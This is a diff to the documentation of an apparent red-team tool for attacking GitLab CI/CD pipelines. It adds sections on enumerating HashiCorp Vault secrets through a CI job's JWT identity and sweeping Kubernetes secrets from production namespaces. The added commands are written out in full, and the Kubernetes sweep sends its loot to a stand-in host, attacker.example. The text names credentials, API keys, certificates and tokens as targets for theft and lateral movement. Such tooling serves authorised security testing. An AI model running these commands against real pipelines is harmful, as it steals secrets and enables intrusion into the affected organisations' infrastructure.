@@ -54,6 +54,30 @@ This will:
 3. Execute the pipeline on the runner
 4. Retrieve the secrets from the pipeline artifacts
 
+### Vault Secret Enumeration
+
+If the target project's CI pipelines authenticate to HashiCorp Vault (common in enterprise environments), enumerate reachable secrets using the CI job's JWT/OIDC identity:
+
+```bash
+gogatoz attack --vault-enum --target group/project \
+  --vault-addr https://vault.internal:8200 --vault-auth-method jwt \
+  --tags shell
+```
+
+This discovers secret engines and reads key-value pairs accessible to the CI job's Vault role. Look for database credentials, API keys, and cloud provider secrets.
+
+### Kubernetes Secret Sweep
+
+When runners execute inside Kubernetes or have access to a kubeconfig, sweep secrets from accessible namespaces:
+
+```bash
+gogatoz attack --k8s-secrets --target group/project \
+  --k8s-namespaces default,production,staging \
+  --tags kubernetes --webhook https://attacker.example/k8s
+```
+
+The sweep uses the runner's service account token to list and read secrets. Common finds include TLS certificates, registry pull secrets, database connection strings, and additional service account tokens for lateral movement.
+
 ## Privilege Escalation
 
 ### Finding Vulnerable Configurations
